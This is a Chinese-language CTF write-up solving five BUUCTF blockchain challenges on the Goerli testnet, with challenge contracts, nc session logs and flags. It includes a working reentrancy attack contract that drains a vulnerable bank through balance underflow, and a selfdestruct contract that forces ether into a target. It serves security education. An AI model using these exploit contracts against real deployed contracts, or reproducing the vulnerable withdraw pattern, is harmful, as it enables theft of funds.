# Blockchain

## BUUCTF

### Checkin

题目描述如下：

> 简简单单的签到题 （所有Blockchain题目均部署在Goerli测试网）
>
> Goerli水龙头：https://goerlifaucet.com/ 
>
> nc 124.221.212.109 10000

以太坊钱包是帮助我们管理以太坊账户的软件应用程序，它能用来保存私钥、创建以太坊交易数据包并以我们的身份在网络上广播。[**Metamask**](https://metamask.io/)是一个基于浏览器扩展的钱包，它运行在`Web`浏览器中，比如`Chrome`。我们可以使用该钱包去链接多种以太坊节点并测试区块链。注册成功后添加`Goerli`测试网络，并去[**Goerli Faucet**](https://goerlifaucet.com/)领取测试币。

![](https://paper.tanyaodan.com/BUUCTF/Checkin/1.png)

`nc`链接靶机，选择`1`选项创建账户，服务器会给我们一个`deployer account`和`token`。

```bash
┌──(tyd㉿kali-linux)-[~/ctf]
└─$ nc 124.221.212.109 10000
Welcome to Blockchain's world,there is an eazy challenge for you!
Your goal is to make isSolved() function returns true!

[1] - Create an account which will be used to deploy the challenge contract
[2] - Deploy the challenge contract using your generated account
[3] - Get your flag once you meet the requirement
[4] - Show the contract source code
[-] input your choice: 1
[+] deployer account: 0xd71CD902Ba1d04197D1C59bF24534828cB375b7F
[+] token: v4.local.F1GNQXmK8Za2LJYV3jSOtZFNHumsNOvHV6HdLiErWMRQ7PnBNDRkaLIlRBD3njfYP2K3R4hORUpFRYR134vDTs6Oz0FjRp04Lq7qRpfq10A3-cUF-LiBJuktZHU4ADHd5lxz9oAk51SkEovATNdCn0ylh0uhTawW4wZBb3XGXo47oQ
[+] please transfer 0.001 test ether to the deployer account for next step
```

用`Metamask`向该地址转账`0.001 GoerliETH`。

![](https://paper.tanyaodan.com/BUUCTF/Checkin/2.png)

转账完成后，选择`2`选项，输入`token`部署合约，拿到`contract address`和`transaction hash`。

```bash
┌──(tyd㉿kali-linux)-[~/ctf]
└─$ nc 124.221.212.109 10000
Welcome to Blockchain's world,there is an eazy challenge for you!
Your goal is to make isSolved() function returns true!

[1] - Create an account which will be used to deploy the challenge contract
[2] - Deploy the challenge contract using your generated account
[3] - Get your flag once you meet the requirement
[4] - Show the contract source code
[-] input your choice: 2
[-] input your token: v4.local.F1GNQXmK8Za2LJYV3jSOtZFNHumsNOvHV6HdLiErWMRQ7PnBNDRkaLIlRBD3njfYP2K3R4hORUpFRYR134vDTs6Oz0FjRp04Lq7qRpfq10A3-cUF-LiBJuktZHU4ADHd5lxz9oAk51SkEovATNdCn0ylh0uhTawW4wZBb3XGXo47oQ
[+] contract address: 0x38A2A8a0aa8efb1b49D9f9E2bCcA94F33b6cfe7D
[+] transaction hash: 0xac761bf32b3e77209a1896c6e79888a68acb30f5879ff80734417dbe09af7807
```

在[**Etherscan**](https://goerli.etherscan.io)中查找对应的交易，也可以看到生成合约的地址。

![](https://paper.tanyaodan.com/BUUCTF/Checkin/3.png)

选择`4`选项查看合约代码，审计代码后发现通过`setGreeting`函数赋值`_greeting = 'HelloNewstarCTF'`后即可解决问题。

```solidity
pragma solidity 0.8.7;

contract Checkin {
    string greeting;

    constructor(string memory _greeting) public {
        greeting = _greeting;
    }

    function greet() public view returns (string memory) {
        return greeting;
    }

    function setGreeting(string memory _greeting) public {
        greeting = _greeting;
    }

    function isSolved() public view returns (bool) {
        string memory key = "HelloNewstarCTF";
        return keccak256(abi.encodePacked(key)) == keccak256(abi.encodePacked(greeting));
    }
}
```

`Solidity`的编译器是一个独立的可执行程序，通常包含在各类编程框架中，也会集成在一些`Ethereum IDE`中，比如[**Remix**](https://remix.ethereum.org)。

我们在`Remix`中新建一个`Checkin.sol`文件，粘贴选项`4`中给出的合约代码后，点击`Compile Checkin.sol`进行编译。

![](https://paper.tanyaodan.com/BUUCTF/Checkin/4.png)

用`Metamask`连接`Remix`后在`At Address`处输入选项`2`中的合约地址后点击`At Address`。

![](https://paper.tanyaodan.com/BUUCTF/Checkin/5.png)

在`Deployed Contracts`的`setGreeting`中给`_greeting`赋值`"HelloNewstarCTF"`，并点击`transact`进行交易。

![](https://paper.tanyaodan.com/BUUCTF/Checkin/6.png)

在`Metamask`中核实交易地址后确认交易，即可与合约地址进行交互。

![](https://paper.tanyaodan.com/BUUCTF/Checkin/7.png)

在[**Etherscan**](https://goerli.etherscan.io/tx/0xf5d58c603a70d6778617c4932f8ae8d76814bf77d5d4aa4d66054f1f1aa6cec5)中查看本次交易，`Click to see More`可以看到`setGreeting(string _greeting)`函数已经被触发啦。

![](https://paper.tanyaodan.com/BUUCTF/Checkin/8.png)

交易完成后，选择`3`选项，输入`token`即可拿到`flag{Ea2y_B1ockChain_Ch3ckin}`。

```bash
┌──(tyd㉿kali-linux)-[~/ctf]
└─$ nc 124.221.212.109 10000
Welcome to Blockchain's world,there is an eazy challenge for you!
Your goal is to make isSolved() function returns true!

[1] - Create an account which will be used to deploy the challenge contract
[2] - Deploy the challenge contract using your generated account
[3] - Get your flag once you meet the requirement
[4] - Show the contract source code
[-] input your choice: 3
[-] input your token: v4.local.F1GNQXmK8Za2LJYV3jSOtZFNHumsNOvHV6HdLiErWMRQ7PnBNDRkaLIlRBD3njfYP2K3R4hORUpFRYR134vDTs6Oz0FjRp04Lq7qRpfq10A3-cUF-LiBJuktZHU4ADHd5lxz9oAk51SkEovATNdCn0ylh0uhTawW4wZBb3XGXo47oQ
[+] flag: flag{Ea2y_B1ockChain_Ch3ckin}
```

------

### Guess Number

题目描述如下：

> 猜猜数字是什么？
>
> 0x168d2A47c58ae63ea2a2A4c622259c84086f791D@Goerli 
>
> nc 124.221.212.109 10001

`nc`链接靶机，选择`2`选项查看合约代码，审计代码后发现通过`guess`函数赋值使得`guess_number = number`即可触发`isSolved()`函数解决问题。

```solidity
pragma solidity ^0.4.23;

contract guessnumber {
    mapping(address => uint) private answer;
    address owner;
    uint number;
    
    constructor()public{
        owner = msg.sender;
    }

    event isSolved();

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }

    function set_number(uint new_number) public onlyOwner{
        number=new_number;
    }

    function guess(uint guess_number) public {
        answer[msg.sender]=guess_number;
        if(answer[msg.sender]==number){
            emit isSolved();
        }
    }
}
```

我们在`Remix`中新建一个`GuessNumber.sol`文件，粘贴选项`2`中给出的合约代码后，点击`Compile GuessNumber.sol`进行编译。

![](https://paper.tanyaodan.com/BUUCTF/GuessNumber/1.png)

由于题目给出的是一个固定地址，可以在[**Etherscan**](https://goerli.etherscan.io/address/0x168d2a47c58ae63ea2a2a4c622259c84086f791d)中看到该地址的交易信息，随意访问一个`Method`为`Guess`的`Txn Hash`，可以看到它是一个交互成功且存在`Logs`项的交易（`Logs`项说明这笔交易触发了事件）。在`Input Data`中可以看到`uint256`型变量`_guess`被赋值为`7810111911511697114678470`。用`Metamask`连接`Remix`后在`At Address`处输入题目描述中的合约地址后点击`At Address`。

![](https://paper.tanyaodan.com/BUUCTF/GuessNumber/2.png)

在`Deployed Contracts`的`guess`中给`guess_number`赋值为`"7810111911511697114678470"`，并点击`transact`进行交易。

![](https://paper.tanyaodan.com/BUUCTF/GuessNumber/3.png)

在`Metamask`中核实交易地址后确认交易，即可与合约地址进行交互。

![](https://paper.tanyaodan.com/BUUCTF/GuessNumber/4.png)

在[**Etherscan**](https://goerli.etherscan.io/tx/0x45c2b7ee162fb3046ef5ec3c813ea9bb3a93f370d2d7d70c5e6ec91f4435891d)中可以查看到本次交易已经触发了`isSolved`事件，复制`Transaction Hash`。

![](https://paper.tanyaodan.com/BUUCTF/GuessNumber/5.png)

交易完成后，选择`1`选项，输入`tx hash`即可拿到`flag{Wh4t_1s_th3_numb3r}`。

```bash
┌──(tyd㉿kali-linux)-[~/ctf]
└─$ nc 124.221.212.109 10001
Just guess the secret number!
Get the flag after isSolved event is emitted！

[1] - Get your flag once you meet the requirement
[2] - Show the contract source code
[-] input your choice: 1
[-] input tx hash that emitted isSolved event: 0x45c2b7ee162fb3046ef5ec3c813ea9bb3a93f370d2d7d70c5e6ec91f4435891d
[+] flag: flag{Wh4t_1s_th3_numb3r}
```

------

### The chosen one

题目描述如下：

> 只有天选之人才能做出这道题，你是其中之一吗？ 
>
> nc 124.221.212.109 10002

查看提示：

> 只有特定尾号的地址才能与合约交互 https://vanity-eth.tk/

`nc`链接靶机，选择`1`选项创建账户，服务器会给我们一个`deployer account`和`token`。

```bash
┌──(tyd㉿kali-linux)-[~/ctf]
└─$ nc 124.221.212.109 10002
Who is the chosen one?
Get the flag after isSolved event is emitted！

[1] - Create an account which will be used to deploy the challenge contract
[2] - Deploy the challenge contract using your generated account
[3] - Get your flag once you meet the requirement
[4] - Show the contract source code
[-] input your choice: 1
[+] deployer account: 0xaa68C4eB1a7b6224434F5125b8436B161227Bae3
[+] token: v4.local.BjOiqkzMdk1cl8-0PjmXSp1rKdG3WoMmL47Rdi3H7bLnuDV2ZbxanylQBhm3kY_IcSsjuMzXVcxI0ajp_3KTETO0cwp35Cekb5gfEY-zu6LPj0Cw7BSCtrmeo0UlwcfBRRHRNqIA1kFCE9wu3HEdTg3628U4N2aWx-FJk4tJZMtQ3Q
[+] please transfer 0.030 test ether to the deployer account for next step
```

先不着急转账，选择`4`选项查看合约代码，审计代码后发现只有`owner`才有权限调用`getflag()`函数，从而触发`isSolved()`函数解决问题。`Solidity`的内置函数`require`可以用来测试是否满足前提条件，若不满足条件将导致合约执行因异常而停止并退回剩余的`gas`。

`msg`对象是一个所有合约都可以访问的输入，它代表触发这个合约执行的交易。`sender`属性是发起这个交易的发起方地址。当条件`uint(msg.sender) & 0xffff==0xabcd`为真时，即交易发起方的后四位地址为`abcd`时，就能执行`owner = msg.sender;`让当前交易的信息发送者成为`owner`。

```solidity
pragma solidity ^0.4.24;

contract choose {
    address owner;
    
    event isSolved();
    
    constructor() public{
        owner = msg.sender;
    }
    
    function chooseone() public{
        require(uint(msg.sender) & 0xffff==0xabcd);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    function getflag() onlyOwner {
        emit isSolved();
    }
}
```

要想满足该条件就需要一个后四位地址为`abcd`的账户，但是以太坊账户地址都是基于`Hash`算法随机生成的，我们该如何获得后四位地址指定为`abcd`的以太坊账户呢？根据提示访问[**VANITY-ETH**](https://vanity-eth.tk/)，这个网站可以帮助我们获得指定前缀或后缀的以太坊账号。

![](https://paper.tanyaodan.com/BUUCTF/TheChosenOne/1.png)

指定`Suffix`为`abcd`后点击`Generate`，等待了`25`秒后得到了符合要求的账户地址，点击`Save`保存文件。在`Metamask`中以`json`类型导入账户，然后给选项`1`中的地址转账`0.001 GoerliETH`，交易完成后可以在[**Etherscan**](https://goerli.etherscan.io/tx/0xabd0fded3e105bad962349e7e198b2d6e78c4c1d8f7f3d5bf5f46e9a1c69d9e3)中可以查看到本次交易。转账完成后，选择`2`选项，输入`token`部署合约，拿到`contract address`和`transaction hash`。

```bash
┌──(tyd㉿kali-linux)-[~]
└─$ nc 124.221.212.109 10002
Who is the chosen one?
Get the flag after isSolved event is emitted！

[1] - Create an account which will be used to deploy the challenge contract
[2] - Deploy the challenge contract using your generated account
[3] - Get your flag once you meet the requirement
[4] - Show the contract source code
[-] input your choice: 2
[-] input your token: v4.local.BjOiqkzMdk1cl8-0PjmXSp1rKdG3WoMmL47Rdi3H7bLnuDV2ZbxanylQBhm3kY_IcSsjuMzXVcxI0ajp_3KTETO0cwp35Cekb5gfEY-zu6LPj0Cw7BSCtrmeo0UlwcfBRRHRNqIA1kFCE9wu3HEdTg3628U4N2aWx-FJk4tJZMtQ3Q
[+] contract address: 0x57025cAb9EADB43305ADd6F7255a3Fb22E90FA99
[+] transaction hash: 0x2bc71298566b202eef98d43be3d2a34fc06f04c87a1a92c86fc33b609bef6b50
```

然后在`Remix`中新建一个`TheChosenOne.sol`文件，粘贴选项`4`中给出的合约代码后，点击`Compile TheChosenOne.sol`进行编译。

![](https://paper.tanyaodan.com/BUUCTF/TheChosenOne/2.png)

用`Metamask`连接`Remix`后在`At Address`处输入选项`2`中的合约地址后点击`At Address`。

![](https://paper.tanyaodan.com/BUUCTF/TheChosenOne/3.png)

在`Deployed Contracts`中点击`chooseone`发起交互后，再点击`getflag`进行交互。

![](https://paper.tanyaodan.com/BUUCTF/TheChosenOne/4.png)

在[**Etherscan**](https://goerli.etherscan.io/tx/0x223683bbb656d68e51431935facfa8ba0a7951b7f6e9edb099e43016eb0d5f53)中可以找到本次交易，可以看到本次交易触发了`isSolved`事件，复制`Transaction Hash`，`nc`链接靶机选择`3`选项，输入`token`和`tx hash`即可得到`flag{Y0u_ar3_th3_ch00s3n_0n3}`。

```bash
┌──(tyd㉿kali-linux)-[~]
└─$ nc 124.221.212.109 10002
Who is the chosen one?
Get the flag after isSolved event is emitted！

[1] - Create an account which will be used to deploy the challenge contract
[2] - Deploy the challenge contract using your generated account
[3] - Get your flag once you meet the requirement
[4] - Show the contract source code
[-] input your choice: 3
[-] input your token: v4.local.BjOiqkzMdk1cl8-0PjmXSp1rKdG3WoMmL47Rdi3H7bLnuDV2ZbxanylQBhm3kY_IcSsjuMzXVcxI0ajp_3KTETO0cwp35Cekb5gfEY-zu6LPj0Cw7BSCtrmeo0UlwcfBRRHRNqIA1kFCE9wu3HEdTg3628U4N2aWx-FJk4tJZMtQ3Q
[-] input tx hash that emitted isSolved event: 0x223683bbb656d68e51431935facfa8ba0a7951b7f6e9edb099e43016eb0d5f53
[+] flag: flag{Y0u_ar3_th3_ch00s3n_0n3}
```

------

### Demolition Trucks

题目描述如下：

> 卖flag辣，只要你给钱，我就给你flag
>
> nc 124.221.212.109 10003

`nc`链接靶机，选择`1`选项创建账户，服务器会给我们一个`deployer account`和`token`。

```bash
┌──(tyd㉿kali-linux)-[~]
└─$ nc 124.221.212.109 10003
pay any balance for flag
Get the flag after isSolved event is emitted！

[1] - Create an account which will be used to deploy the challenge contract
[2] - Deploy the challenge contract using your generated account
[3] - Get your flag once you meet the requirement
[4] - Show the contract source code
[-] input your choice: 1
[+] deployer account: 0x7E68F0cf6FbFb729054c17AaD396b8ce90Cd6179
[+] token: v4.local.RJlH2Xg05Wq23DZeINtVx2Imit_lgbaysFcncBe3KjOLgG1IevqWsQ-b9gfuER88cyPom5dtnTjs5cEt8k7Oz03qq-I5we0Z2Yt7N2kfBEQ5vXOljV3QRsDGUT1edaErQau24xEsSZiw2_HkJBj9efc00OoDDqn2-QHy4kWdEOokgg
[+] please transfer 0.001 test ether to the deployer account for next step
```

用`Metamask`向该地址转账`0.001 GoerliETH`。待交易完成后选择`2`选项，输入`token`部署合约，拿到`contract address`和`transaction hash`。

```bash
┌──(tyd㉿kali-linux)-[~]
└─$ nc 124.221.212.109 10003
pay any balance for flag
Get the flag after isSolved event is emitted！

[1] - Create an account which will be used to deploy the challenge contract
[2] - Deploy the challenge contract using your generated account
[3] - Get your flag once you meet the requirement
[4] - Show the contract source code
[-] input your choice: 2
[-] input your token: v4.local.RJlH2Xg05Wq23DZeINtVx2Imit_lgbaysFcncBe3KjOLgG1IevqWsQ-b9gfuER88cyPom5dtnTjs5cEt8k7Oz03qq-I5we0Z2Yt7N2kfBEQ5vXOljV3QRsDGUT1edaErQau24xEsSZiw2_HkJBj9efc00OoDDqn2-QHy4kWdEOokgg
[+] contract address: 0x6A85f96Bdae3CC81D53caC82Ff93EA9f252b7c9d
[+] transaction hash: 0x875b69c3caca00f6369ddc310da72bb7a51eb0bd5bb40fca613f9892f4f9b5d2
```

选择`4`选项查看合约代码，当合约地址的`balance`大于`0`时就能触发`isSolved()`函数。直接向合约地址转账的时候会交易失败，是因为合约账户没有任何函数标识为`payable`，所以这个合约不能接受外部转账。

```solidity
pragma solidity ^0.4.23;

contract Trucks {
    constructor() public{
    }

    event isSolved();

    function getBalance() public view returns (uint256){
        return address(this).balance;  
    }

    function payforflag() public returns (bool){
        address _to = 0x498d4BAddD959314591Dc14cb10790e8Df68b1b1;
        require(address(this).balance>0);
        emit isSolved();
        _to.transfer(address(this).balance);

    }
}
```

由题目名字联想到一种强制转账方式，即通过合约自毁来强行向目标合约地址转账。由于是刚接触区块链的题，不知道为什么我添加`1 Wei`再部署以下合约代码一直失败，但是`0 Wei`能够部署成功。

```solidity
pragma solidity ^0.4.23;

contract Demolition {
    function kill() public payable {
        selfdestruct(address(0x6A85f96Bdae3CC81D53caC82Ff93EA9f252b7c9d));
    }
}
```

所以我就想着先部署合约代码，再向自建合约地址转账（在[**Etherscan**](https://goerli.etherscan.io/tx/0x495b59e652ec9ed383477f25c63a25084bc397845ea03c9c85e7b08621a4cdd7)中可以找到本次交易），然后再调用`kill()`函数让自建合约自毁（在[**Etherscan**](https://goerli.etherscan.io/address/0x8bb8487a06e383015e9820d0d7cd75532044f774)中可以看到自建合约已经自毁啦），从而实现向目标合约地址强制转账（在[**Etherscan**](https://goerli.etherscan.io/address/0x6A85f96Bdae3CC81D53caC82Ff93EA9f252b7c9d)中可以看到目标合约账户已经收到了0**.**0001 Ether）。

![](https://paper.tanyaodan.com/BUUCTF/DemolitionTrucks/1.png)

向目标合约地址强制转账成功后，直接调用题目合约地址中的`payforflag`即可解决问题。

![](https://paper.tanyaodan.com/BUUCTF/DemolitionTrucks/2.png)

在[**Etherscan**](https://goerli.etherscan.io/tx/0xf45803485a696dcf3ae8a7b00009e802b09fbb0f8abb4d60a695e316f11874dd)中找到本次交易，可以看到本次交易触发了`isSolved`事件，复制`Transaction Hash`，`nc`链接靶机选择`3`选项，输入`token`和`tx hash`即可得到`flag{1t_1s_a_pl3asant_c00p3rati0n}`。

```bash
┌──(tyd㉿kali-linux)-[~]
└─$ nc 124.221.212.109 10003
pay any balance for flag
Get the flag after isSolved event is emitted！

[1] - Create an account which will be used to deploy the challenge contract
[2] - Deploy the challenge contract using your generated account
[3] - Get your flag once you meet the requirement
[4] - Show the contract source code
[-] input your choice: 3
[-] input your token: v4.local.RJlH2Xg05Wq23DZeINtVx2Imit_lgbaysFcncBe3KjOLgG1IevqWsQ-b9gfuER88cyPom5dtnTjs5cEt8k7Oz03qq-I5we0Z2Yt7N2kfBEQ5vXOljV3QRsDGUT1edaErQau24xEsSZiw2_HkJBj9efc00OoDDqn2-QHy4kWdEOokgg
[-] input tx hash that emitted isSolved event: 0xf45803485a696dcf3ae8a7b00009e802b09fbb0f8abb4d60a695e316f11874dd
[+] flag: flag{1t_1s_a_pl3asant_c00p3rati0n}
```

------

### baby bank

题目描述如下：

> 简单的重入攻击
>
> nc 124.221.212.109 10004

`nc`链接靶机，选择`1`选项创建账户，服务器会给我们一个`deployer account`和`token`。

```bash
┌──(tyd㉿kali-linux)-[~]
└─$ nc 124.221.212.109 10004
Easy Re-Entrancy
Get the flag after isSolved event is emitted！

[1] - Create an account which will be used to deploy the challenge contract
[2] - Deploy the challenge contract using your generated account
[3] - Get your flag once you meet the requirement
[4] - Show the contract source code
[-] input your choice: 1
[+] deployer account: 0xef2AF8b5727f5B922931C85300Cc3b8df94E0C70
[+] token: v4.local.AIgPEKqdLTwKTv7UT3ZOSOLv8Zf82aBA6sTh_CkGZuhslBh1kVc3T-jYCjc_ACIy7Q7FUpNIKvKCXu0bwRyMKebiK2VfjQ8ocRpoOVzrJH65m0yXk4460tzeV2Mtd5JrQBdrd9lZqKPOKdRU6kbr-LPM3aDBPBZtBGOOUxhWEfzfcg
[+] please transfer 0.012 test ether to the deployer account for next step
```

用`Metamask`向该地址转账`0.001 GoerliETH`。转账完成后，选择`2`选项，输入`token`部署合约，拿到`contract address`和`transaction hash`。

```bash
┌──(tyd㉿kali-linux)-[~]
└─$ nc 124.221.212.109 10004    
Easy Re-Entrancy
Get the flag after isSolved event is emitted！

[1] - Create an account which will be used to deploy the challenge contract
[2] - Deploy the challenge contract using your generated account
[3] - Get your flag once you meet the requirement
[4] - Show the contract source code
[-] input your choice: 2
[-] input your token: v4.local.AIgPEKqdLTwKTv7UT3ZOSOLv8Zf82aBA6sTh_CkGZuhslBh1kVc3T-jYCjc_ACIy7Q7FUpNIKvKCXu0bwRyMKebiK2VfjQ8ocRpoOVzrJH65m0yXk4460tzeV2Mtd5JrQBdrd9lZqKPOKdRU6kbr-LPM3aDBPBZtBGOOUxhWEfzfcg
[+] contract address: 0x1B29865d35cE7738E480828924C2ca7209ed393c
[+] transaction hash: 0xa9cbcfda5c1753c1e41b5cca382cf6c4b56ca226ccdee2a7a2ec276cd027349e
```

选择`4`选项查看合约代码，审计代码后发现`withdraw`函数先转账交易后修改变量`balance`值，存在`Solidity`重入攻击漏洞。在`Solidity`中，转账给以太坊合约账户时，会执行合约账户相应合约代码的匿名函数（`fallback`）。

> `fallback` 函数
>
> 合约最多有一个匿名函数，该函数不能有参数也不能有返回值。虽然`fallback`函数没有参数但是仍然可以用`msg.data`来获取随调用提供的任何有效数据。
>
> 函数声明为：`fallback() external [payable]` 或`fallback (bytes calldata _input) external [payable] returns (bytes memory _output)`
>
> 如果在一个与合约交互的调用中，没有任何函数与给定的函数标识符匹配（或没有提供调用数据），那么fallback函数就会被执行。
>
> 一个没有定义`fallback` 函数的合约直接接收以太币（没有函数调用，即使用 `send` 或 `transfer`）会抛出一个异常， 并返还以太币。所以如果你想让你的合约接收以太币，必须实现标记为`payable`的`fallback`函数。每当合约收到以太币（没有任何数据），`fallback`函数也会执行。如果`fallback`函数没有标记`payable`，则合约不能通过常规交易接收以太币。
>
> 如果一个合约没有标记为`payable`的`fallback`函数，则该合约可以作为`coinbase transaction`（又名 `miner block reward`）的接收者，或作为 `selfdestruct` 的目标地址来接收以太币。
>
> 注意，`fallback`函数没有 `function` 关键字，可见性必须是`external`。

```solidity
pragma solidity ^0.4.23;

contract Bank{
    mapping (address => uint) public balance;
    event Received(address Sender, uint Value);
    event isSolved();
    uint public chance;

    constructor() public {
        chance = 1;
    }
    
    function() external payable {
        emit Received(msg.sender, msg.value);
    }

    function gift() public {
        require(chance==1);
        balance[msg.sender] = 2;
        chance=0;
    }

    function withdraw(uint amount) public{
        require(amount==2);
        require(balance[msg.sender] >= amount);
        msg.sender.call.value(amount)();
        balance[msg.sender] -= amount;
    }

    function payforflag() public {
        require(balance[msg.sender] >= 10000000000);
        balance[msg.sender]=0;
        chance=1;
        emit isSolved();
        address _to = 0x498d4BAddD959314591Dc14cb10790e8Df68b1b1;
        _to.transfer(address(this).balance);
    }

}
```

我们故技重施给目标合约地址强制转账用来支付后续攻击操作的`gas`，先部署以下合约代码（在[**Etherscan**](https://goerli.etherscan.io/tx/0x723886556493e1aff41dace5bedebf3281b3bfdc069e5d488202580fd517446d)中可以看到合约创建成功），再向自建合约地址转账（在[**Etherscan**](https://goerli.etherscan.io/tx/0xc03ec1f436a41764db8816a7329d9a5f69b70f302622dfc9df3fe7304a6ed91b)中可以找到本次交易），然后再调用`kill()`函数让自建合约自毁（在[**Etherscan**](https://goerli.etherscan.io/address/0x1b29865d35ce7738e480828924c2ca7209ed393c)中可以看到自建合约已经自毁啦），从而实现向目标合约地址强制转账（在[**Etherscan**](https://goerli.etherscan.io/address/0x1B29865d35cE7738E480828924C2ca7209ed393c)中可以看到目标合约账户已经收到了5 Finney）。

```solidity
pragma solidity ^0.4.23;

contract Demolition {
    function () public payable {}
    function kill() public payable {
        selfdestruct(address(0x1B29865d35cE7738E480828924C2ca7209ed393c));
    }
}
```

编写攻击合约代码，`attack()`函数会调用`Bank`中的`gift()`初始化`0x1B29865d35cE7738E480828924C2ca7209ed393c`中的`balance = 2`，然后调用`Bank`的`withdraw`函数转账。任何从合约`A`到合约`B`的信息交互（包括以太币的转移）都会将控制权交给合约`B`，这就使得合约`B`能够在交互结束前回调合约`A`的代码。因此在转账过程中会默认调用攻击合约中的匿名函数`fallback`，从而再次进入`withdraw`函数执行。攻击合约代码中利用`bool`型变量`tag`限制了重入`withdraw`函数的次数，只要造成了`balance`的下溢出就停止重入攻击。

```solidity
pragma solidity ^0.4.23;

import "./Example.sol";

contract Attack {
    Bank b;
    bool tag;

    constructor() public {
        b = Bank(0x1B29865d35cE7738E480828924C2ca7209ed393c);
        tag = false;
    }

    function attack() public {
        b.gift();
        b.withdraw(2);
    }

    function getflag() public {
        b.payforflag();
    }

    function() public payable {
        require(tag==false);
        tag = true;
        b.withdraw(2);
    }

}
```

部署攻击合约后，通过`attack`造成`balance`下溢出为2<sup>256</sup>-2，这样就能满足`payforflag()`函数中的判断条件`balance[msg.sender] >= 10000000000`，点击`getflag`成功在`payforflag()`函数中触发`isSolved()`。

![](https://paper.tanyaodan.com/BUUCTF/BabyBank/1.png)

在[**Etherscan**](https://goerli.etherscan.io/tx/0x43db3805a5829f97c593f91a0ddc7dbda8e4d31f6000c2f4ec59f2b82c373788)中查找本次交易，可以看到本次交易触发了`isSolved`事件，复制`Transaction Hash`，`nc`链接靶机选择`3`选项，输入`token`和`tx hash`即可得到`flag{Y0u_ar3_r0bbing_th3_bank}`。

```bash
┌──(tyd㉿kali-linux)-[~]
└─$ nc 124.221.212.109 10004
Easy Re-Entrancy
Get the flag after isSolved event is emitted！

[1] - Create an account which will be used to deploy the challenge contract
[2] - Deploy the challenge contract using your generated account
[3] - Get your flag once you meet the requirement
[4] - Show the contract source code
[-] input your choice: 3
[-] input your token: v4.local.AIgPEKqdLTwKTv7UT3ZOSOLv8Zf82aBA6sTh_CkGZuhslBh1kVc3T-jYCjc_ACIy7Q7FUpNIKvKCXu0bwRyMKebiK2VfjQ8ocRpoOVzrJH65m0yXk4460tzeV2Mtd5JrQBdrd9lZqKPOKdRU6kbr-LPM3aDBPBZtBGOOUxhWEfzfcg
[-] input tx hash that emitted isSolved event: 0x43db3805a5829f97c593f91a0ddc7dbda8e4d31f6000c2f4ec59f2b82c373788
[+] flag: flag{Y0u_ar3_r0bbing_th3_bank}
```

![](https://paper.tanyaodan.com/BUUCTF/BabyBank/2.png)

------

